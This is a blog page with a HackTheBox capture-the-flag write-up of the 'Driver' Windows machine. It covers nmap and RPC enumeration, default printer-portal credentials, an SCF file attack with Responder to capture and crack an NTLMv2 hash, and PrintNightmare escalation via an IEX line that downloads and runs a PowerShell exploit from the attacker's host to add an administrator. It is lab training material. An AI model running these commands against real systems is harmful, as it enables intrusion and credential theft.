<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE| http-auth:| HTTP/1.1 401 Unauthorized\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).135/tcp open msrpc syn-ack Microsoft Windows RPC445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/driver/driver/" />


    <title>
        
            Driver :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Driver">
<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE| http-auth:| HTTP/1.1 401 Unauthorized\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).135/tcp open msrpc syn-ack Microsoft Windows RPC445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3."><meta itemprop="datePublished" content="2022-09-20T14:03:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="595"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Driver"/>
<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE| http-auth:| HTTP/1.1 401 Unauthorized\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).135/tcp open msrpc syn-ack Microsoft Windows RPC445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3."/>



    <meta property="og:title" content="Driver" />
<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE| http-auth:| HTTP/1.1 401 Unauthorized\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).135/tcp open msrpc syn-ack Microsoft Windows RPC445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/hackthebox/driver/driver/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T14:03:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="HackTheBox" />



    <meta property="article:published_time" content="2022-09-20 14:03:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox/driver/driver/">Driver</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT    STATE SERVICE      REASON  VERSION
80/tcp  open  http         syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-16T06:45:20
|_  start_date: 2021-11-16T06:30:11
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 7h17m59s, deviation: 0s, median: 7h17m59s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 39061/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 37846/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</code></pre><p>Basically a windows machine with a web server, visiting the website requires admin creds</p>
<p>RPC open on port 135&hellip;lets do Rpc enumeration</p>
<pre tabindex="0"><code>$rpcdump.py 10.10.11.106
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.11.106
Protocol: [MS-RSP]: Remote Shutdown Protocol
Provider: wininit.exe
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
Bindings:
ncacn_ip_tcp:10.10.11.106[49408]
ncalrpc:[WindowsShutdown]
ncacn_np:\\DRIVER[\PIPE\InitShutdown]
ncalrpc:[WMsgKRpc07AEA0]
...
</code></pre><p>There was 445 endpoints so for readability I put it in a separate file called <code>rpcdump.txt</code></p>
<p>Back to the website it says: “MFP Firmware Update Center. Please enter password for admin”</p>
<p>Defaults creds work lol</p>
<p><code>admin : admin</code></p>
<p>After login we see a printer</p>
<p>In Firmware updates page we can uplaod files (upload Firmware)</p>
<p>As samba open those are probably saved in the shares</p>
<p>After some research (google) I discovered <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF file attacks</a></p>
<p>we create an exploit named <code>@exploit.scf</code></p>
<p>we start a responder to capture hashes<br>
<code>sudo responder -wrf --lm -v -I tun0</code></p>
<p>I had issues with tun0 interface because of my network configuration, as I am on virtualbox (Nat network + vpn from guest)</p>
<p>But eventually after clicking on submit button we get the following:</p>
<pre tabindex="0"><code>[SMB] NTLMv2 Client : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash : tony::DRIVER:6f09da70e73b9237:674092FE6EC25CB23CBB01D554A9B854:0101000000000000DEB3B39E53B8D70144991278610991070000000002000400270027000000000000000000
</code></pre><p>Crack the hash with john+rockyou</p>
<pre tabindex="0"><code>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
liltony (tony)
1g 0:00:00:00 DONE (2021-10-03 00:42) 10.00g/s 327680p/s 327680c/s 327680C/s softball27..eatme1
</code></pre><p>So creds are <code>tony : liltony</code></p>
<p>we connect with evil-winrm<br>
<code>evil-winrm -i 10.10.11.106 -u tony -p liltony</code></p>
<p>USER FLAG<br>
<code>_Evil-WinRM_ PS C:\Users\tony\Desktop&gt; type user.txt</code></p>
<h2 id="privileges-escalation">Privileges Escalation</h2>
<p>rpcdump show us the printer is enabled so <code>spool service</code> runs&hellip;we use <a href="https://github.com/outflanknl/PrintNightmare">printNighmare</a> exploit</p>
<p>we upload the file with evil-winrm
<code>upload CVE-2021-1675.ps1</code></p>
<p>But we cannot import it</p>
<pre tabindex="0"><code>File C:\Users\tony\Desktop\cve-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1

- Import-Module .\cve-2021-1675.ps1
- ```

  ```

- CategoryInfo : SecurityError: (:) [Import-Module], PSSecurityException
- FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
</code></pre><p>we can bypass that with the help of download the file with help of <code>IEX</code> command</p>
<p>we start a python server where the exploit is and download with IEX on evil-winrm</p>
<pre tabindex="0"><code>IEX(New-Object Net.Webclient).downloadstring(&#39;http://10.10.15.45:4444/CVE-2021-1675.ps1&#39;) //used port 4444 for server because 80 was busy (had another server)
</code></pre><p>Then we invoke it and choose our creds</p>
<pre tabindex="0"><code>Invoke-Nightmare -NewUser &#34;nairolf&#34; -NewPassword &#34;nairolf&#34;

[+] added user nairolf as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
</code></pre><p>Now we are admin&hellip;lets connect as such<br>
<code>evil-winrm -i 10.10.11.106 -u nairolf -p nairolf</code></p>
<p>ROOT FLAG<br>
<code>_Evil-WinRM_ PS C:\Users\Administrator\Desktop&gt; type root.txt</code></p>
<p>This room was anything but easy&hellip;htb got a problem rating their boxes</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/hackthebox/">HackTheBox</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
